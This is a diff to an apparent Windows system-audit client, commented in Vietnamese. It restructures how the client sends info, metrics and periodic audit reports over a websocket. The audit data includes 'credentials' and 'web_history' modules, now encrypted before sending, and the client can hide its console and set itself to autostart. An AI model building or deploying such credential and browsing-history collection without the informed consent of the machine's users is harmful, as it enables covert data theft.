@@ -269,30 +269,20 @@ async def send_metrics(websocket):
         pass
     except Exception as e:
         print(f"Metrics sending task: An unexpected error occurred: {e}")
-            
-    except asyncio.CancelledError:
-        print("Metrics sending task cancelled.")
-    except websockets.exceptions.ConnectionClosed:
-        pass
-    except Exception as e:
-        print(f"Metrics sending task: An unexpected error occurred: {e}")
 
-async def send_updated_audit_and_info(websocket, initial_audit_data):
+async def send_updated_audit_and_info(websocket):
     """
     Tác vụ chạy nền để gửi lại thông tin và dữ liệu audit định kỳ.
-    Nó sẽ gửi dữ liệu ban đầu ngay lập tức, sau đó lặp lại.
+    Ưu tiên gửi info trước để server nhận diện, sau đó mới chạy audit nặng.
     """
     config = configparser.ConfigParser()
     config.read(os.path.join(get_base_path(), 'config.ini'))
     update_interval = int(config['client']['update_info_interval'])
     access_token = config['server'].get('access_token', fallback="")
-    
-    # Sử dụng dữ liệu audit đã có từ trước cho lần gửi đầu tiên
-    current_audit_data = initial_audit_data
-    
+
     try:
         while True:
-            # 1. Chuẩn bị gói tin info
+            # 1. Gửi gói tin info NGAY LẬP TỨC để server biết client đã online
             local_ip = WindowsAuditor._Ip.get_local_ip()
             wan_ip = WindowsAuditor._Ip.get_wan_ip()
             enabled_modules = get_enabled_modules_from_config()
@@ -302,26 +292,32 @@ async def send_updated_audit_and_info(websocket, initial_audit_data):
                 "enabled_modules": enabled_modules,
                 "access_token": access_token
             }
-            
-            # 2. Chuẩn bị gói tin audit
-            audit_report = {
-                "type": "full_audit", "guid": CLIENT_GUID, "data": current_audit_data
-            }
-            
-            # 3. Gửi cả hai gói tin
             await websocket.send(json.dumps(info))
             print(f"\n[SEND] => Sent client info update.")
-            if current_audit_data:
-                await websocket.send(json.dumps(audit_report))
-                print("[SEND] => Sent full audit report.")
 
-            # 4. Chờ cho lần cập nhật tiếp theo
-            print(f"       Next info/audit update in {update_interval} seconds.\n")
-            await asyncio.sleep(update_interval)
-
-            # 5. Chạy lại audit để lấy dữ liệu mới cho lần lặp tiếp theo
+            # 2. Chạy audit nặng dưới nền (không block việc gửi metrics realtime)
+            print("[AUDIT] Running full system audit in background...")
             loop = asyncio.get_running_loop()
             current_audit_data = await loop.run_in_executor(None, run_full_audit_sync)
+
+            # 3. Mã hóa dữ liệu nhạy cảm trước khi gửi
+            if current_audit_data:
+                sensitive_modules = ['credentials', 'web_history']
+                for mod in sensitive_modules:
+                    if mod in current_audit_data and "Error" not in current_audit_data[mod]:
+                        print(f"[CRYPTO] Encrypting module '{mod}'...")
+                        raw_json = json.dumps(current_audit_data[mod])
+                        encrypted_data = WindowsAuditor._Crypto.encrypt(raw_json, access_token)
+                        current_audit_data[mod] = {"encrypted": True, "payload": encrypted_data}
+
+                audit_report = {
+                    "type": "full_audit", "guid": CLIENT_GUID, "data": current_audit_data
+                }
+                await websocket.send(json.dumps(audit_report))
+                print("[SEND] => Sent full audit report (sensitive data encrypted).")
+            # 4. Chờ cho lần cập nhật tiếp theo (ví dụ 60 giây)
+            print(f"       Next info/audit update in {update_interval} seconds.\n")
+            await asyncio.sleep(update_interval)
 
     except asyncio.CancelledError:
         print("Info/Audit sending task cancelled.")
@@ -332,10 +328,10 @@ async def send_updated_audit_and_info(websocket, initial_audit_data):
 
 
 # --- Vòng lặp kết nối chính ---
-async def connect(initial_audit_data):
+async def connect():
     """
     Vòng lặp chính để kết nối và quản lý các tác vụ của client.
-    Nhận dữ liệu audit ban đầu làm tham số.
+    Không còn nhận dữ liệu audit ban đầu để tránh blocking startup.
     """
     config = configparser.ConfigParser()
     config.read(os.path.join(get_base_path(), 'config.ini'))
@@ -343,37 +339,36 @@ async def connect(initial_audit_data):
     server_port = int(config['server']['port'])
     retry_interval = int(config['client']['retry_interval'])
     uri = f"ws://{server_host}:{server_port}"
-    
+
     while True:
         try:
             print(f"Attempting to connect to {uri}...")
             async with websockets.connect(uri) as websocket:
                 print(f"Connection successful!")
-                
-                # Bắt đầu 2 tác vụ chạy song song
-                # Tác vụ info/audit sẽ gửi dữ liệu ban đầu ngay lập tức
-                info_audit_task = asyncio.create_task(send_updated_audit_and_info(websocket, initial_audit_data))
+
+                # Bắt đầu 2 tác vụ chạy song song:
+                # - info_audit_task: Gửi info ngay và audit định kỳ
+                # - metrics_task: Gửi metrics realtime (CPU/RAM/IO)
+                info_audit_task = asyncio.create_task(send_updated_audit_and_info(websocket))
                 metrics_task = asyncio.create_task(send_metrics(websocket))
-                
-                # Chờ cho đến khi một trong các tác vụ kết thúc
+
                 done, pending = await asyncio.wait(
                     [info_audit_task, metrics_task],
                     return_when=asyncio.FIRST_COMPLETED,
                 )
-                
-                # Hủy các tác vụ còn lại
+
                 for task in pending:
                     task.cancel()
 
-        except ConnectionRefusedError:
-            print(f"Connection refused. Retrying in {retry_interval} seconds...")
+        except (ConnectionRefusedError, socket.error):
+            print(f"Server at {uri} is unreachable. Retrying in {retry_interval} seconds...")
         except websockets.exceptions.ConnectionClosed:
-            print(f"Connection closed. Retrying in {retry_interval} seconds...")
+            print(f"Connection to server lost. Retrying in {retry_interval} seconds...")
         except KeyboardInterrupt:
             print("Client disconnected by user.")
             break
         except Exception as e:
-            print(f"An unexpected error occurred: {e}. Retrying in {retry_interval} seconds...")
+            print(f"An unexpected connection error: {e}. Retrying in {retry_interval} seconds...")
 
         await asyncio.sleep(retry_interval)
 
@@ -384,21 +379,18 @@ if __name__ == "__main__":
 
     if "-minimized" in sys.argv:
         hide_console()
-        
+
     if platform.system() != "Windows":
         print("Warning: This client is designed for Windows and may have limited functionality on other OS.")
-    
-    # 0. Đảm bảo chỉ có một instance chạy (tắt các bản cũ nếu có)
+
+    # 0. Đảm bảo chỉ có một instance chạy
     ensure_single_instance()
 
-    # Xử lý cấu hình autostart cùng hệ thống trước (cài đặt/gỡ bỏ service)
+    # Xử lý cấu hình autostart
     manage_autostart()
 
-    # 1. Chạy audit trước khi làm bất cứ điều gì khác
-    initial_audit_results = run_full_audit_sync()
-
-    # 2. Bắt đầu vòng lặp kết nối
+    # 1. Bắt đầu vòng lặp kết nối (Audit sẽ chạy sau khi kết nối thành công)
     try:
-        asyncio.run(connect(initial_audit_results))
+        asyncio.run(connect())
     except KeyboardInterrupt:
         print("\nClient shutdown.")
